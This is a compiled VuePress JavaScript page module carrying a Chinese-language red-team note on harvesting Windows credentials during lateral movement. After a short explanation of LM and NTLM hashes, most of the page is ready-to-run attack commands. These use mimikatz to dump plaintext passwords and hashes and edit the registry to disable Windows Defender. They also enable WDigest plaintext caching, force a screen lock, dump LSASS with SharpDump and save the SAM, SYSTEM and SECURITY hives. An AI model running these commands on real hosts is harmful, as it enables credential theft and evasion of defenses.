import{_ as t}from"./_plugin-vue_export-helper.cdc0426e.js";import{o as r,c as i,a as s,b as e,d as o,e as a,r as l}from"./app.a5c8fdbc.js";const d={},p=a(`<h2 id="获取凭证的快捷路径" tabindex="-1"><a class="header-anchor" href="#获取凭证的快捷路径" aria-hidden="true">#</a> 获取凭证的快捷路径</h2><p>翻用户桌面，可能存在服务器密码信息，甚至其它服务器</p><p>找内部wiki手册，邮箱等东西可能存在服务器IP和密码信息</p><h2 id="lm-hash和ntlm-hash" tabindex="-1"><a class="header-anchor" href="#lm-hash和ntlm-hash" aria-hidden="true">#</a> LM Hash和NTLM Hash</h2><p>Windows操作系统中的密码由两部分加密组成，即 LM Hash 和 NTLM Hash。</p><p>LM Hash（LAN Manager Hash），本质为DES加密，密码不足14位用0补全。</p><p>自Server 2003之后，Windows的认证方式均为NTLM Hash。</p><p>自Server 2008开始默认禁用LM Hash， 当密码超过14位时候会采用NTLM加密</p><p>如果抓取的LM Hash为<code>AAD3B435B51404EEAAD3B435B51404EE</code>说明密码为空或LM Hash被禁用。</p><table><thead><tr><th></th><th><strong>2003</strong></th><th><strong>win7</strong></th><th><strong>2008</strong></th><th><strong>2012</strong></th></tr></thead><tbody><tr><td>LM</td><td>√</td><td></td><td></td><td></td></tr><tr><td>NTLM</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p><strong>Hash一般存储在两个地方</strong></p><ul><li><strong>SAM文件</strong>：存储在本机，对应本地用户</li><li><strong>NTDS.DIT文件</strong>：存储在域控上，对应域用户</li></ul><h2 id="server-2008-及之前抓明文密码" tabindex="-1"><a class="header-anchor" href="#server-2008-及之前抓明文密码" aria-hidden="true">#</a> Server 2008 及之前抓明文密码</h2><p>将mimikatz上传到目标主机（需要免杀），并且要SYSTEM权限。</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token comment">#读取散列值和明文密码</span>
mimikatz<span class="token punctuation">.</span>exe <span class="token string">&quot;privilege::debug&quot;</span> <span class="token string">&quot;log&quot;</span> <span class="token string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="token keyword">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="server-2012-之后抓明文密码" tabindex="-1"><a class="header-anchor" href="#server-2012-之后抓明文密码" aria-hidden="true">#</a> Server 2012 之后抓明文密码</h2><p>手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录+导出Hash+本地mimikatz抓明文</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token comment">#临时关闭Defender</span>
REG ADD <span class="token string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender&quot;</span> <span class="token operator">/</span>v DisableAntiSpyware <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 1 <span class="token operator">/</span>f gpupdate <span class="token operator">/</span>force

<span class="token comment">#修改注册表来让Wdigest Auth保存明文口令</span>
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest <span class="token operator">/</span>v UseLogonCredential <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 1 <span class="token operator">/</span>f

<span class="token comment">#强制锁屏</span>
rundll32<span class="token punctuation">.</span>exe user32<span class="token punctuation">.</span>dll<span class="token punctuation">,</span>LockWorkStation

<span class="token comment">#恢复</span>
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest <span class="token operator">/</span>v UseLogonCredential <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="导出ntlm-hash" tabindex="-1"><a class="header-anchor" href="#导出ntlm-hash" aria-hidden="true">#</a> 导出NTLM Hash</h2><h3 id="sharpdump-mimikatz本地读取" tabindex="-1"><a class="header-anchor" href="#sharpdump-mimikatz本地读取" aria-hidden="true">#</a> Sharpdump+ mimikatz本地读取</h3><p>需要<code>.NET 3.5</code>版本框架，需要系统管理员权限</p>`,21),c={href:"https://github.com/GhostPack/SharpDump",target:"_blank",rel:"noopener noreferrer"},h=a(`<p>Dump 的文件默认是 bin 后缀，拖到本地机器把 bin 重命名为 zip，然后解压出来再丢给 mimikatz</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code>mimikatz<span class="token punctuation">.</span>exe <span class="token string">&quot;sekurlsa::minidump debug45&quot;</span> <span class="token string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="token string">&quot;exit&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="注册表-mimikatz本地读取" tabindex="-1"><a class="header-anchor" href="#注册表-mimikatz本地读取" aria-hidden="true">#</a> 注册表 + mimikatz本地读取</h3><p><strong>（1）导出SAM和System文件</strong></p><p>Win2000和XP需要先提到<strong>SYSTEM</strong>，Server 03开始直接可以reg save 也需要<strong>系统管理员权限</strong></p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>reg save hklm<span class="token punctuation">\\</span>sam sam.hive
reg save hklm<span class="token punctuation">\\</span>system system.hive
reg save hklm<span class="token punctuation">\\</span>security security.hive
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>（2）mimikatz本地读取 NTLM Hash</strong></p><p>mimikatz可以从内存中提取明文编码、散列值、PIN和Kerberos票据；还可以用来执行哈希传递、票据传递和构建黄金票据（Golden Ticket）。</p><div class="language-powershell line-numbers-mode" data-ext="powershell"><pre class="language-powershell"><code><span class="token comment">#将导出的文件和mimikatz放到同一目录</span>
mimikatz<span class="token punctuation">.</span>exe <span class="token string">&quot;lsadump::sam /sam:sam.hive /system:system.hive /security:security.hive&quot;</span> <span class="token keyword">exit</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>`,9);function u(m,v){const n=l("ExternalLinkIcon");return r(),i("div",null,[p,s("p",null,[e("下载地址："),s("a",c,[e("https://github.com/GhostPack/SharpDump "),o(n)])]),h])}const b=t(d,[["render",u],["__file","横向移动-本机凭证获取.html.vue"]]);export{b as default};
